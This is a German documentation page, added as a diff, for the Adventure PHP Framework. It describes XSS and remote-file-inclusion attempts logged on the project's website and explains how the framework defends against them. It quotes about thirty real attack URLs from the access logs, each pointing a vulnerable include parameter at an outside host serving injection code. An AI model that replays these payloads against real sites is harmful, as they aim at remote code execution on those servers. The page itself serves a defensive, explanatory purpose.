@@ -1,0 +1,137 @@
+<doku:title parent="100" tags="xss,bullet proof,schutz vor xss,secure by design,hacker proof" title="Hacking &amp; das APF 2009/2010" urlname="Hacking-und-das-APF-2009-2010">
+  Der Artikel Hacking &amp; das APF 2009/2010 zeigt, wie die APF-Webseite durch das Framework
+  erfolgreich vor XSS-Attacken geschützt werden konnte.
+</doku:title>
+<h3 id="Chapter-1-Einleitung"><a href="#Chapter-1-Einleitung">1. Einleitung</a></h3>
+<p>
+   Im Jahr 2009 konnte eine drastisch gestiegene Anzahl von XSS- und Code-Injection-Attacken auf der
+   APF-Webseite verzeichnet werden. So ließen sich in 2009 <em>92.334</em> bekannte Attacken
+   abgefangen und protokollieren, die Zugriffs-Logs enthielten insgesamt <em>672.152</em> Versuche.
+</p>
+<p class="apf-promise">
+   <img src="http://media.adventure-php-framework.org/img/illustrations/security-goblet.png" width="200" height="190" alt="APF security award" />
+   <strong>Das APF-Security-Versprechen:</strong>
+   Nutzen Sie das APF und profitieren Sie automatisch von dessen Sicherheitsmechanismen! Von Grund
+   auf sichere Anwendungen verhindern die Kompromittierung Ihres Systems, gewährleisten somit
+   die Sicherheit der Nutzer und Ihres Renommees und lassen Sie beruhigt schlafen.
+</p>
+<p>
+   Dieser Artikel soll Ihnen zeigen, welche Möglichkeiten das APF bietet, um dieser Gefahr
+   offensiv zu begegnen und die eigene Anwendung absichern zu können.
+</p>
+
+<h3 id="Chapter-2-Angriffe"><a href="#Chapter-2-Angriffe">2. Angriffe</a></h3>
+<h4 id="Chapter-2-1-Art-der-Angriffe"><a href="#Chapter-2-1-Art-der-Angriffe">2.1. Art der Angriffe</a></h4>
+<p>
+   Bei der Art der Angriffe handelt es sich meist um XSS- oder Code-Injection-Attacken. Dieser versuchen eine
+   Schwachstelle auszunutzen um Fremd-Inhalte oder eigenen Code einzuschleusen. Die Signatur der Requests folgt bei
+   95% aller Versuche folgendem Muster:
+</p>
+<gen:highlight type="code">[?|&amp;]vulnerability_param=http://domain.tld/some/path/injection_code.ext</gen:highlight>
+<p>Die Namen der Parameter variieren dabei sehr stark:</p>
+<ul>
+   <li>tpl_pgb_moddir</li>
+   <li>page</li>
+   <li>mosConfig_absolute_path</li>
+   <li>sourcedir</li>
+   <li>file</li>
+   <li>dir[inc]</li>
+   <li>includedir</li>
+   <li>phpbb_root_path</li>
+   <li>_SERVER[DOCUMENT_ROOT]</li>
+   <li>_zb_path</li>
+   <li>cfg[path][contenido]</li>
+   <li>base_folder</li>
+   <li>spaw_root</li>
+   <li>includePath</li>
+</ul>
+<p>
+   Die folgende Liste enthält eine Auswahl an URLs, mit denen versucht wurde, Fremd-Inhalte und
+   Code einzuschleusen:
+</p>
+<gen:highlight type="code">
+/!rfihttp://www.nicheresaleprofits.com/cbmarketer/image/id??
+/!scan23http://sito.blackdrag0n.net/Cartoon/idnew.txt?
+/%20%20//////?_SERVER[DOCUMENT_ROOT]=http://www.koreadefence.net/data/shirohige/zfxid.txt??
+/%20%20//?_shop_path=http://emwave.knu.ac.kr/bbs/skin/happycast_category_brown/fx29id.txt???
+/%20%20//?mosconfig_absolute_path=http://largeface.com/gnuboard4/gnus/fxid.txt?
+/%20%20//inc/functions_inc.php?gb_pfad=http://82.146.51.16/scan/copyright.txt??
+/%20%20//includes/DProtect/Framework/EmailTemplates.class.php?GLOBALS[RootPath]=http://www.junggosum.com/bbs/data/sports_2/idxx.txt??
+/%20%20//modules/Forums/admin/index.php?phpbb_root_path=http://n34.biz/id1.txt???
+/%20%20//tools/send_reminders.php?noSet=0&amp;includedir=http://jnhsolutions.com.au/datingsite/temp/userimages/1.txt??
+/%20%20/e404.php?DOCUMENT_ROOT=http://alandar.net/www2/log1.txt?
+/?mosConfig_absolute_path=http://MiNgOnIsHoW.altervista.org/ArEa511/ideal.txt????
+/?dir_ws=http://champrond-en-gatine.org//administrator/components/com_joomla-visites/core/include/updates/v6id.txt??????
+/?_zb_path=http://kb27.co.kr/bbs///data/cok.txt??
+/tools/send_reminders.php?includedir=http://208.98.22.241/id.txt??%0D??
+/?autoLoadConfig[999][0][autoType]=include&amp;autoLoadConfig[999][0][loadFile]=http://204.3.167.134/xxx?
+/modules/My_eGallery/index.php?basepath=http://urogyn.co.kr/uro/install/idxx.txt??
+/show_news.php?cutepath=http://laloggia.by.ru/up/ctrl.txt??
+/skin/zero_vote/setup.php?dir=http://206.126.97.21/~talagaho/id.txt???
+/Neos_Chronos/header.php?base_folder=http://www.jocainmo.es/img/.z/d??
+/buscar.php?query=http://www.candidography.com/id1.txt??
+/?_PHPLIB[libdir]=http://cdshop.net.ru////cron/hjr.txt??
+/inc/cmses/aedating4CMS.php?dir[inc]=http://daiyangmetal.co.kr/intranet/zb/skin/ggambo5100_gallery//colby/id.txt??
+/naboard_pnr.php?skin=http://www.cinepopbrasil.com.br/sistem.txt???
+/phpSecurePages/secure.php?&amp;cfgProgDir=http://www.steannareptile.it//administrator/idi.txt???
+/phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root=http://tdaa.by.ru/safe.txt???
+/skin/ggambo7002_board/contact.php?dir=http://hana.nef-i.co.kr/pds/zfxid1.txt??
+/jahoot.com/search.php?=http://www.chicagofc.co.kr/fitness/data/come/fx29id1.txt??
+/PNphpBB2/includes/functions_admin.php?phpbb_root_path=http://laloggia.by.ru/up/ctrl.txt??
+/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?http://musicadelibreria.net/footer??
+/Page//wp-content/plugins/dm-albums/template/album.php?SECURITY_FILE=http://kb27.co.kr/bbs///data/cok.txt??
+</gen:highlight>
+
+<h4 id="Chapter-2-2-Protokollierte-Angriffe"><a href="#Chapter-2-2-Protokollierte-Angriffe">2.2. Protokollierte Angriffe</a></h4>
+<p>
+   Eine anschließende Analyse der Fehler-Logs ergab 3 Fehler-Gruppen. Auch in diesem wird versucht,
+   die URL so zu manipulieren, dass die dahinterliegende Software eigene Inhalte darstellt oder
+   Remote-Code ausführt:
+</p>
+<gen:highlight type="code">
+parse_url(/Seite/048-Webseite-erstellen%20%20/page.php?doc=http://unixstats.org/tools/idxx.txt??): Unable to parse URL (Number: 2, File: ***/APF/tools/link/LinkGenerator.php, Line: 3114)
+[Document::loadContentFromFile()] Design "Seite" not existent in namespace "APF\modules\comments\pres\templates"! Please check your template code (***). (Number: 256, File: ***/APF/core/pagecontroller/pagecontroller.php, Line: 1378)
+[Frontcontroller::parseActions()] No config section for action key "setLangu" available in configuration file "***_actionconfig.ini" in namespace "DOCS\biz\actions" and context "sites::***"! (Number: 256, File: ***/APF/core/frontcontroller/Frontcontroller.php, Line: 555)
+</gen:highlight>
+<p>
+   Die <em>erste Zeile</em> ist der Versuch, externen Code einzuschleusen. Dieser wird zunächst dazu
+   genutzt, Informationen über die eingesetzte Applikation und den Webserver auszuspähen, folgende
+   Requests versuchen dann die Applikation geziehlt zu manipulieren.
+</p>
+<p>
+   Nutzt der Anwender das <int:link pageid="069" />, werden derartige Anriffe in eine nach dem
+   <int:link pageid="137">InputFilter</int:link> definierten Satz von Parametern und Werten
+   übersetzt und damit der Angriff unschädlich gemacht.
+</p>
+<p>
+   Nutzt der Entwickler Komponenten wie den <int:link pageid="138">LinkGenerator</int:link>
+   so wird bei einer semantisch ungültigen URL eine Exception geworfen. Dieser kann durch
+   die globale <int:link pageid="145"/> sehr einfach abgefangen und protokolliert werden.
+</p>
+<p>
+   Die <em>zweite Zeile</em> beschreibt den Versuch, einen Parameter der Applikation geziehlt zu manipulieren,
+   um eigene Inhalte darzustellen. Das APF bietet zwar in der Taglib
+   <int:link pageid="046" anchor="Chapter-1-2-Importdesign">&lt;core:importdesign /&gt;</int:link>
+   die Möglichkeit, das eingebundene Template per URL-Parameter zu beeinflussen, jedoch wird der
+   Template-Pfad sicher zusammengesetzt.
+</p>
+<p>
+   In der <em>dritten Zeile</em> wird versucht, die Parameter einer Front-Controller-Action so zu manipulieren,
+   dass die vom Angreifer gewünschte Aktion ausgeführt wird. Im APF wird eine Action jedoch
+   in einer Konfigurations-Datei definiert, die URL-Parameter verweisen lediglich auf diese. Damit
+   ist es nicht möglich, einen Action-Aufruf per URL zu manipulieren.
+</p>
+
+<h3 id="Chapter-3-Fehlerhandling"><a href="#Chapter-3-Fehlerhandling">3. Fehlerhandling</a></h3>
+<p>
+   Um dieser Flut von Attacken möglichst wenig Möglichkeit zu bieten, die Applikation zu
+   analysieren, wird empfohlen, einen eigenen 
+   <int:link pageid="144" anchor="Chapter-3-Erweiterung">ErrorHandler</int:link> zu implementieren,
+   der die aufkommenden Fehler in eine Log-Datei schreibt und über die Ursache schweigt.
+</p>
+<p>
+   Wie ein solcher ErrorHandler implementiert werden kann, zeigt der Wiki-Eintrag
+   <a class="wiki" href="http://wiki.adventure-php-framework.org/Script_kiddies_ErrorHandler" title="Script kiddies ErrorHandler">Script kiddies ErrorHandler</a>.
+</p>
+
+<core:importdesign namespace="APF\modules\comments\pres\templates" template="comment" categorykey="de_108" />
